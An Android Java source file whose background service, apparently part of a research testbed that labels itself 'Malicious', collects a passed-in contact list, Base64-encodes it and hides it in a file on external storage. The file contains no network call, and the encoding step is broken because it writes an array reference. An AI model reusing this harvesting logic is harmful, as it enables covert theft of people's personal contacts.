package com.sec.iitr.tinytorch;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static android.content.ContentValues.TAG;
import static java.io.File.createTempFile;

public class BackgroundService3 extends Service {

    private boolean isRunning;
    private Context context;
    private Handler handler;
    HashMap<String,String> contacts_List = new HashMap<String,String>();
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        this.context = this;
        this.isRunning = false;

    }

    private Runnable myTask = new Runnable() {

        public void run() {
            try {

                new ForegroundCheckTask().execute();
                Log.e(TAG, "fromService");
                stopSelf();
            }
            catch (Exception ex)
            {
                Log.e(TAG, ex.toString());
            }
        }


    };

    @Override
    public void onDestroy() {
        this.isRunning = false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onStartCommand()","Malicious");

        if(!this.isRunning) {
            this.isRunning = true;

            contacts_List = (HashMap<String,String>) intent.getExtras().get("CONTACT_LIST");

            handler = new Handler(Looper.getMainLooper());
            handler.post(myTask);
        }
        return START_STICKY;
    }
    class ForegroundCheckTask extends AsyncTask<String[], Void, String> {
        String[] result;
        @Override
        protected  String doInBackground(String[]... params) {

            write_contact(result);
            return "";
        }

        private Boolean write_contact(final String[] param) {

            Log.e("Called","CAlled");
            try {
                String data="LIST";

                for(Map.Entry<String,String > entry : contacts_List.entrySet()){
                    data =data +"\n" + entry.getKey() + " : " + entry.getValue() +"\n";
                }


                byte[] encryptArray = Base64.getEncoder().encode(data.getBytes());

                try {
                    try {
                        File file = new File(getExternalFilesDir(Environment.getDataDirectory().getAbsolutePath()).getAbsolutePath(),"com.sec.iitr.tinytorch");
                        if(!file.exists()){
                            file.mkdir();
                        }

                        try{
                            File gpxfile = new File(file, "Contact_List.txt");
                            if (!gpxfile.exists()) {
                                gpxfile.createNewFile();
                            }

                            StringBuilder text = new StringBuilder();
                            BufferedReader br = new BufferedReader(new FileReader(gpxfile));
                            String line;
                            while ((line = br.readLine()) != null) {
                                text.append(line);
                                text.append('\n');
                            }
                            br.close() ;
                            FileWriter writer = new FileWriter(gpxfile);
                            writer.append(text +" \n "+encryptArray.toString());
                            writer.flush();
                            writer.close();

                        }catch (Exception e){
                            e.printStackTrace();
                            Log.e("error",e.toString());

                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        Log.e("error",e.toString());
                    }
                }
                catch (Exception ex)
                {
                    Log.e("Unable to Write", "Error !");
                    Log.e("error",ex.toString());
                }

            }
            catch (Exception ex)
            {
                Log.e("error",ex.toString());
            }
            finally {
                stopSelf();
            }


            return true;
        }
    }
}
